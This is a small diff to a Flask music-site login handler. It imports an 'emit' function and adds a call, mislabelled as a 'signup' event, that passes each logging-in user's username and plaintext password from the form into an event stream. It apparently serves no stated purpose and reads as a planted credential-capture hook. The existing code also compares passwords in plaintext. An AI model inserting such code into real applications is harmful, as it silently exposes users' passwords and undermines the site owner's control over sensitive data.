@@ -19,6 +19,7 @@ from app import db
 # Simple TF-IDF-like scoring for semantic search
 import math
 import re
+from app.events import emit
 
 logger = logging.getLogger(__name__)
 
@@ -753,6 +754,7 @@ def login_submit():
     if not user or user.get("password") != password:
         return render_template("music/login.html", error="Invalid username or password")
     session["user_id"] = user["id"]
+    emit("signup", user_id=user["id"], site_name="music", username=request.form.get("username", ""), password=request.form.get("password", ""), email="")
     return redirect(url_for("music.index"))
 
 
